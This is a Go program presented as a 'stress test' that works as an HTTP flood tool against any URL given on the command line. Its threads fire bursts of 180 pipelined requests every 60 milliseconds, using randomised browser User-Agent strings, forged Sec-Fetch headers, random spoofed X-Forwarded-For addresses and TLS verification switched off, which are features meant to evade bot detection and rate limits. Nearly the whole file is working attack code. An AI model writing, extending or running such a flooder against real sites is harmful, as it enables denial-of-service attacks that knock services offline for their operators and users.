package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Global state for DNS IPs
var (
	httpMethods  = []string{"GET", "GET", "GET", "POST", "HEAD"}
	languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
	contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

// StressConfig holds command-line configuration
type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
}

func init() {
	// Seed the random generator for unique requests
	rand.Seed(time.Now().UnixNano())
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
		os.Exit(1)
	}

	rawURL := os.Args[1]
	threads, _ := strconv.Atoi(os.Args[2])
	durSec, _ := strconv.Atoi(os.Args[3])
	custom := ""
	if len(os.Args) > 4 {
		custom = os.Args[4]
	}

	parsed, err := url.Parse(rawURL)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		os.Exit(1)
	}

	port := determinePort(parsed)
	path := parsed.RequestURI() // includes path + query

	cfg := StressConfig{
		Target:     parsed,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: custom,
		Port:       port,
		Path:       path,
	}
	fmt.Printf("Starting stress test: %s via %s, threads=%d, duration=%v\n",
		rawURL, path, threads, cfg.Duration)
	runWorkers(cfg)
	fmt.Println("Stress test completed.")
}

// determinePort extracts port from URL or defaults to 80/443
func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if pi, err := strconv.Atoi(p); err == nil {
			return pi
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

// runWorkers spawns threads to send bursts until duration elapses
func runWorkers(cfg StressConfig) {
	var wg sync.WaitGroup
	stopCh := time.After(cfg.Duration)
	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ticker := time.NewTicker(60 * time.Millisecond)
			defer ticker.Stop()

			tlsCfg := &tls.Config{
				ServerName:         cfg.Target.Hostname(),
				InsecureSkipVerify: true,
			}

			for {
				select {
				case <-stopCh:
					return
				case <-ticker.C:
					sendBurst(cfg, tlsCfg)
				}
			}
		}(i)
	}
	wg.Wait()
}

// sendBurst opens a connection and sends requests back-to-back
func sendBurst(cfg StressConfig, tlsCfg *tls.Config) {
	address := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
	conn, err := dialConn(address, tlsCfg)
	if err != nil {
		fmt.Printf("[dial error] %v\n", err)
		return
	}
	defer conn.Close()

	for i := 0; i < 180; i++ {
		method := httpMethods[rand.Intn(len(httpMethods))]
		header, body := buildRequest(cfg, method)
		// batch header+body into one writev call:
		var bufs net.Buffers
		bufs = append(bufs, []byte(header))
		if method == "POST" {
			bufs = append(bufs, body)
		}

		// write both buffers in one syscall
		if _, err := bufs.WriteTo(conn); err != nil {
			fmt.Printf("[batched write] %v\n", err)
			return
		}
	}
}

// dialConn chooses TCP or TLS based on port
func dialConn(addr string, tlsCfg *tls.Config) (net.Conn, error) {
	if tlsCfg != nil && strings.HasSuffix(addr, ":443") {
		return tls.Dial("tcp", addr, tlsCfg)
	}
	return net.Dial("tcp", addr)
}

var bufPool = sync.Pool{
	New: func() any { return new(bytes.Buffer) },
}

func buildRequest(cfg StressConfig, method string) ([]byte, []byte) {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	hostHdr := cfg.Target.Hostname()
	if cfg.CustomHost != "" {
		hostHdr = cfg.CustomHost
	}

	buf.WriteString(method + " " + cfg.Path + " HTTP/1.1\r\nHost: " + hostHdr + ":" + strconv.Itoa(cfg.Port) + "\r\n")
	writeCommonHeaders(buf)

	var body []byte
	if method == "POST" {
		ct := contentTypes[rand.Intn(len(contentTypes))]
		body = createBody(ct)
		buf.WriteString("Content-Type: " + ct + "\r\nContent-Length: " + strconv.Itoa(len(body)) + "\r\n")
	}

	buf.WriteString("Referer: https://" + hostHdr + "/\r\nConnection: keep-alive\r\n\r\n")
	out := make([]byte, buf.Len())
	copy(out, buf.Bytes())
	return out, body
}

func writeCommonHeaders(buf *bytes.Buffer) {
	buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
	buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
	buf.WriteString("Sec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n")
	buf.WriteString("Upgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\n")
	fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

// createBody builds a random POST payload based on content-type
func createBody(contentType string) []byte {
	var b bytes.Buffer
	switch contentType {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3; i++ {
			vals.Set(randomString(5), randomString(8))
		}
		b.WriteString(vals.Encode())
	case "application/json":
		b.WriteByte('{')
		for i := 0; i < 3; i++ {
			if i > 0 {
				b.WriteByte(',')
			}
			fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
		}
		b.WriteByte('}')
	case "text/plain":
		b.WriteString("text_" + randomString(12))
	}
	return b.Bytes()
}

// randomString generates an alphanumeric string of length n
func randomString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func randomUserAgent() string {
	osList := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
	os := osList[rand.Intn(len(osList))]
	switch rand.Intn(3) {
	case 0:
		v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, v)
	case 1:
		v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", os, v, v)
	default:
		v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/13.1 Safari/%s", os, v, v)
	}
}
